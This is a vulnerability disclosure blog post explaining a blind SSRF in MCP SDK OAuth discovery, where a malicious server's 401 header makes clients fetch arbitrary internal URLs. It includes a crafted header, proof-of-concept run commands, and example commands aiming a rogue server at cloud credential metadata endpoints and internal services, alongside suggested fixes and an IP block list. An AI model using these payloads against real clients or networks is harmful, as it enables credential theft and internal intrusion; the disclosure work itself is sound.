---
title: "MCP SSRF via OAuth PRM Discovery: How a 401 Turns Your Client Into a Proxy"
date: 2026-02-27
draft: false
description: "A malicious MCP server can force any connecting client (including Claude Desktop and Claude Code) to send HTTP requests to arbitrary internal URLs by injecting a crafted resource_metadata parameter in a 401 response. Both the Python and TypeScript SDKs are affected."
summary: "Second article in my MCP security series. A malicious MCP server returns a 401 with a crafted WWW-Authenticate header pointing resource_metadata at any URL it wants. The MCP SDK fetches that URL without origin validation, resulting in blind SSRF that affects both Python and TypeScript SDKs, Claude Desktop, and Claude Code. Reported to Anthropic VDP, closed as duplicate. Full technical details disclosed here."
tags: ["mcp", "ssrf", "oauth", "vulnerability-research", "responsible-disclosure", "bug-bounty", "python", "typescript"]
categories: ["Vulnerability Research", "Bug Bounty"]
series: ["MCP Security Research"]
featuredImage: "featured.png"
images: ["featured.png", "poc-overview.png", "canary-hit.png", "client-logs.png", "rogue-server-logs.png", "standalone-proof.png"]
---

# MCP SSRF via OAuth PRM Discovery: How a 401 Turns Your Client Into a Proxy

> Second article in my [MCP security research series](/posts/mcp-svg-icon-xss-to-rce/). After looking at the icon rendering surface, I dug into the OAuth authentication layer and found a way to turn any MCP client into a blind SSRF proxy with a single HTTP header.

---

## Context and Disclosure

This was submitted to Anthropic's Vulnerability Disclosure Program and closed as a **duplicate** — meaning the vulnerability is real, already known, and being tracked. No embargo, no patch yet, so here are the full details.

---

## Table of Contents

1. [TL;DR](#tldr)
2. [Background: OAuth in MCP](#background-oauth-in-mcp)
3. [The Vulnerability](#the-vulnerability-no-origin-validation-before-fetch)
4. [Vulnerable Code: Python SDK](#vulnerable-code--python-sdk)
5. [Vulnerable Code: TypeScript SDK](#vulnerable-code--typescript-sdk)
6. [Attack Flow](#attack-flow)
7. [Proof of Concept](#proof-of-concept)
8. [Chaining to a Second Target](#chaining-to-a-second-target)
9. [Real-World Impact](#real-world-impact)
10. [Why This Is a Bug, Not a Design Choice](#why-this-is-a-bug-not-a-design-choice)
11. [Suggested Fix](#suggested-fix)
12. [Conclusion](#conclusion)

---

## TL;DR

A malicious MCP server returns a `401 Unauthorized` with a single crafted header:

```http
WWW-Authenticate: Bearer resource_metadata="http://169.254.169.254/latest/meta-data/"
```

The SDK parses this and immediately fetches that URL — **without checking that it belongs to the same origin as the server**. Blind SSRF, one header, zero interaction beyond connecting.

Both the Python and TypeScript SDKs are affected. Claude Desktop, Claude Code, and any client built on the official SDKs are vulnerable when connecting to an untrusted server.

---

## Background: OAuth in MCP

The MCP specification added OAuth 2.0 support for authenticating clients to servers. The flow follows [RFC 9728: OAuth 2.0 Protected Resource Metadata](https://www.rfc-editor.org/rfc/rfc9728).

Here's how the discovery phase works in the normal, legitimate case:

1. Client connects to an MCP server
2. Server responds `401 Unauthorized` with a `WWW-Authenticate` header
3. The header includes a `resource_metadata` parameter pointing to a JSON document that describes where to find the OAuth authorization server
4. Client fetches that JSON document to discover the OAuth endpoints
5. Client proceeds with the OAuth dance

This discovery step (fetching the `resource_metadata` URL) is where the vulnerability lives.

The spec says the `resource_metadata` URL should be on the same server as the MCP endpoint. The SDK never enforces that.

---

## The Vulnerability: No Origin Validation Before Fetch

The root cause is simple: **the SDK fetches the `resource_metadata` URL before validating that it shares the same origin as the MCP server**.

The validation code exists — `_validate_resource_match()` checks that the PRM response matches the expected resource. But it runs on the **response body**, after the HTTP request has already left the machine.

```
[Attacker injects URL] → [SDK fetches URL] → [_validate_resource_match() runs]
                                    ^
                              SSRF happens here
                              (before any validation)
```

---

## Vulnerable Code: Python SDK

### `mcp/client/auth/utils.py` — URL extraction with no origin check

```python
def build_protected_resource_metadata_discovery_urls(
    www_auth_url: str | None, server_url: str
) -> list[str]:
    urls: list[str] = []
    # Priority 1: WWW-Authenticate header with resource_metadata parameter
    if www_auth_url:
        urls.append(www_auth_url)  # ← attacker-controlled URL, zero validation
    # ... fallback URLs based on server_url ...
    return urls
```

The function receives `www_auth_url` — the value extracted directly from the `WWW-Authenticate` header — and adds it to the fetch queue without any check against `server_url`.

### `mcp/client/auth/oauth2.py` — the fetch itself

```python
for url in prm_discovery_urls:  # includes the unvalidated attacker URL
    discovery_request = create_oauth_metadata_request(url)
    discovery_response = yield discovery_request  # ← HTTP GET to arbitrary URL

    prm = await handle_protected_resource_response(discovery_response)
    if prm:
        await self._validate_resource_match(prm)  # runs AFTER the fetch — too late
        self.context.auth_server_url = str(prm.authorization_servers[0])  # ← chained SSRF
```

The validation runs after the fetch, which is too late. And `prm.authorization_servers[0]` feeds into a **second** fetch, opening the door to chained SSRF (more on that below).

---

## Vulnerable Code: TypeScript SDK

### `packages/client/src/client/auth.ts` — URL parsing without origin check

```typescript
if (resourceMetadataMatch) {
    resourceMetadataUrl = new URL(resourceMetadataMatch);  // No origin validation
}
```

Same pattern as the Python SDK: parse header, store URL, fetch URL. No origin check anywhere in between.

---

## Attack Flow

```
┌──────────┐    1. Connect       ┌───────────────────────┐
│  Victim  │ ──────────────────> │  Malicious MCP Server │
│  MCP     │                     │  (attacker.com/mcp)   │
│  Client  │ <────────────────── │                       │
│          │  2. 401             │  WWW-Authenticate:    │
│          │     resource_metadata="http://169.254..."   │
└──────────┘                     └───────────────────────┘
      │
      │  3. HTTP GET http://169.254.169.254/latest/meta-data/
      │     (SDK fetches this — client never configured to contact it)
      v
┌──────────────────────────────┐
│  Internal Target             │
│  AWS IMDS / cloud metadata   │
│  internal API / localhost    │
└──────────────────────────────┘
```

The server never needs to complete the OAuth flow or respond with valid MCP data. The SSRF fires on the very first connection attempt; the attacker just needs someone to add the server to their config.

![PoC overview: three terminals showing rogue server, canary, and victim client](./poc-overview.png)
*The full PoC: rogue server on port 8080, canary on port 8888, victim client connecting. The client was only configured with port 8080, but port 8888 receives a request.*

---

## Proof of Concept

The PoC uses three components:

| Component | Role |
|:--|:--|
| `malicious_mcp_server.py` | Returns `401` with `resource_metadata` pointing at the canary |
| `canary_server.py` | Logs every incoming request — any hit here proves SSRF |
| `victim_client.py` | Standard MCP client using SDK OAuth flow |
| `proof_standalone.py` | Calls vulnerable SDK functions directly — no servers needed |

```bash
# Prerequisites
pip install mcp httpx

# Terminal 1 — canary (simulates internal service)
python canary_server.py -p 8888

# Terminal 2 — rogue MCP server
python malicious_mcp_server.py -t "http://localhost:8888/ssrf-proof" -p 8080

# Terminal 3 — victim (standard SDK usage)
python victim_client.py -s http://localhost:8080
```

### Rogue server — one 401, nothing else

![Rogue server logs showing a single POST /mcp method=initialize](./rogue-server-logs.png)
*One `initialize` request received, one 401 returned. No MCP data, no OAuth. That's the entire server-side trace.*

### Client logs — the SDK fetches the injected URL

![Client logs showing the SDK making a GET to the canary URL](./client-logs.png)
*The SDK extracted `resource_metadata` from the 401 header and sent a GET to `localhost:8888`, a URL the client was never configured to contact.*

```
httpcore.http11: receive_response_headers.complete
  [..., (b'WWW-Authenticate',
         b'Bearer resource_metadata="http://localhost:8888/ssrf-proof"')]

httpx: HTTP Request: GET http://localhost:8888/ssrf-proof "HTTP/1.0 200 OK"
```

### Canary confirms the hit

![Canary server logs showing SSRF hit with MCP protocol headers](./canary-hit.png)
*The canary logs the incoming request. The `mcp-protocol-version` header is the SDK's fingerprint, proof that this request came from the MCP OAuth discovery flow.*

```
--- SSRF HIT ---
  GET /ssrf-proof
  from 127.0.0.1:33512
  Host: localhost:8888
  mcp-protocol-version: 2025-11-25
----------------
```

### Standalone proof — no infrastructure needed

For a cleaner demonstration, `proof_standalone.py` calls the vulnerable SDK functions directly:

![Standalone proof output showing attacker URLs entering the fetch list](./standalone-proof.png)
*Calling `build_protected_resource_metadata_discovery_urls()` directly: the attacker-controlled AWS metadata URL lands first in the fetch queue, ahead of the legitimate server's discovery URL. Zero validation.*

---

## Chaining to a Second Target

If the first SSRF target returns valid-looking PRM JSON, the attack chains further. The SDK takes `authorization_servers[0]` from the response and fetches `<url>/.well-known/oauth-authorization-server`, a second blind SSRF to a completely different internal host.

```
Rogue server → 401 with resource_metadata="http://attacker-prm.com/"
                                                  │
Client fetches PRM ───────────────────────────────┘
    Returns: {"authorization_servers": ["http://10.0.0.50:9200"]}
                                               │
Client fetches OAuth metadata ─────────────────┘
    GET http://10.0.0.50:9200/.well-known/oauth-authorization-server
    → second-stage SSRF to internal Elasticsearch
```

One rogue server, two internal targets, zero interaction.

---

## Real-World Impact

In practice, the `resource_metadata` URL would point at high-value internal targets:

```bash
# AWS credentials (IMDSv1 — no token required)
python malicious_mcp_server.py -t "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# GCP metadata
python malicious_mcp_server.py -t "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"

# Internal Elasticsearch
python malicious_mcp_server.py -t "http://10.0.0.50:9200/_cluster/health"

# Localhost service probing
python malicious_mcp_server.py -t "http://localhost:6379/"
```

The SSRF is **blind by default**, meaning the rogue server doesn't see the response. But cloud metadata responses often come back as the OAuth discovery body, and in verbose logging mode (common during development), credentials can leak directly into logs. The chained variant is even more effective: if the internal service returns JSON, the SDK processes it and may expose fields through error messages or follow-up requests.

---

## Why This Is a Bug, Not a Design Choice

Unlike the [icon sanitization gap](/posts/mcp-svg-icon-xss-to-rce/) where the spec deliberately uses `MAY`, the spec is explicit here: the `resource_metadata` URL **MUST** be hosted on the same server as the MCP endpoint.

The SDK developers knew this. `_validate_resource_match()` exists precisely for that purpose. It's a sequencing error: the validation runs on the response body after the request completes, instead of on the URL before it's fetched.

```python
# Current (broken):
fetch(attacker_url)           # SSRF happens
validate_response_body()      # too late

# Correct:
validate_url_origin()         # block it here
fetch(validated_url)          # safe
validate_response_body()      # defense in depth
```

---

## Suggested Fix

### Option 1: Origin validation before fetch

The straightforward fix: validate that the URL shares the same scheme, host, and port as the MCP server before adding it to the fetch list:

```python
def build_protected_resource_metadata_discovery_urls(
    www_auth_url: str | None, server_url: str
) -> list[str]:
    urls: list[str] = []
    if www_auth_url:
        server_parsed = urlparse(server_url)
        www_auth_parsed = urlparse(www_auth_url)
        if (server_parsed.scheme == www_auth_parsed.scheme and
            server_parsed.netloc == www_auth_parsed.netloc):
            urls.append(www_auth_url)
        else:
            logger.warning(
                f"Ignoring resource_metadata URL {www_auth_url!r} — "
                f"origin does not match server {server_url!r}"
            )
    # ... fallback URLs derived from server_url (safe) ...
    return urls
```

Two comparisons. Enforces what the spec already requires. Blocks every variant of this attack.

### Option 2: Block private/internal IP ranges

As defense in depth, reject URLs that resolve to private address space:

```python
import ipaddress

BLOCKED_NETWORKS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("169.254.0.0/16"),  # link-local / IMDS
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("::1/128"),
    ipaddress.ip_network("fc00::/7"),
]
```

Note: IP blocklisting alone is insufficient. An attacker with a public hostname that DNS-rebinds to a private IP can bypass it. Origin validation is the correct primary fix.

---

## Conclusion

One header, one connection attempt, blind SSRF. No OAuth flow completed, no MCP tools invoked, no user interaction beyond adding the server to their config.

The fix is straightforward: validate the URL origin before fetching. The validation logic already exists in the codebase, just in the wrong order.

Both articles in this series point to the same broader pattern: the MCP ecosystem is moving fast, the attack surface is growing, and security assumptions that hold in trusted environments break down the moment you connect to an untrusted server. If you're building on the MCP SDKs, treat every server as hostile by default.

---

*Research and writeup by [@felixbillieres](https://github.com/felixbillieres) (elliot_belt)*
